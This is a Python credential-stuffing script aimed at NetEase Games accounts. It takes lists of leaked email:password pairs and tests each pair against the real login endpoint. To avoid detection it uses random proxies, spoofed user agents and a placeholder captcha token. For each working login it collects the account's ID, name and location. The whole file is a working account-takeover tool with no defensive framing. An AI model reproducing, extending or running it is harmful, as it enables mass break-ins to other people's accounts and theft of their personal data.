import hashlib
import random
import requests
from fake_useragent import UserAgent
from typing import Tuple, List, Optional

ua = UserAgent()

def get_md5(password: str) -> str:
    """Get MD5 hash of password"""
    return hashlib.md5(password.encode()).hexdigest()

def get_random_proxy(proxies: Optional[List[str]] = None):
    """Get random proxy from list"""
    if not proxies:
        return None
    proxy = random.choice(proxies)
    return {"http": f"http://{proxy}", "https": f"http://{proxy}"}

def check_account(email: str, password: str, proxies: Optional[List[str]] = None) -> Tuple[str, str]:
    """
    Check Netease account
    
    Returns:
        Tuple of (status, detail)
        status: 'working', 'invalid', 'banned', 'error'
    """
    try:
        md5_pwd = get_md5(password)
        headers = {
            "Pragma": "no-cache",
            "Accept": "*/*",
            "User-Agent": ua.random,
            "recaptcha-token": "test"
        }
        
        login_url = "https://account.neteasegames.com/oauth/v2/email/login?lang=en_US"
        login_data = {
            "account": email,
            "hash_password": md5_pwd,
            "client_id": "official",
            "response_type": "cookie",
            "redirect_uri": "https://account.neteasegames.com/account/home?lang=en_US",
            "state": "official_state"
        }
        
        proxy_dict = get_random_proxy(proxies)
        
        # Login attempt
        r = requests.post(
            login_url,
            data=login_data,
            headers=headers,
            timeout=15,
            proxies=proxy_dict
        )
        response = r.json()
        
        # Check responses
        if response.get("code") == 1006:
            return ("invalid", "Invalid password")
        if "Account does not exist" in r.text:
            return ("banned", "Account does not exist")
        if response.get("code") == 0:
            # Get user info
            info_url = "https://account.neteasegames.com/ucenter/user/info?lang=en_US"
            r2 = requests.get(
                info_url,
                headers=headers,
                timeout=10,
                proxies=proxy_dict
            )
            info = r2.json()
            user_id = info["user"]["user_id"]
            name = info["user"]["account_name"]
            location = info["user"]["location"]
            detail = f"ID:{user_id} | Name:{name} | Loc:{location}"
            return ("working", detail)
        else:
            return ("banned", "Unknown error")
            
    except requests.exceptions.Timeout:
        return ("error", "Request timeout")
    except requests.exceptions.ConnectionError:
        return ("error", "Connection error")
    except Exception as e:
        return ("error", str(e))

def process_combos(combos: List[str], proxies: Optional[List[str]] = None) -> List[dict]:
    """Process multiple accounts"""
    results = []
    for combo in combos:
        if ":" not in combo:
            continue
        email, password = combo.strip().split(":", 1)
        status, detail = check_account(email, password, proxies)
        results.append({
            "account": f"{email}:{password}",
            "status": status,
            "detail": detail
        })
    return results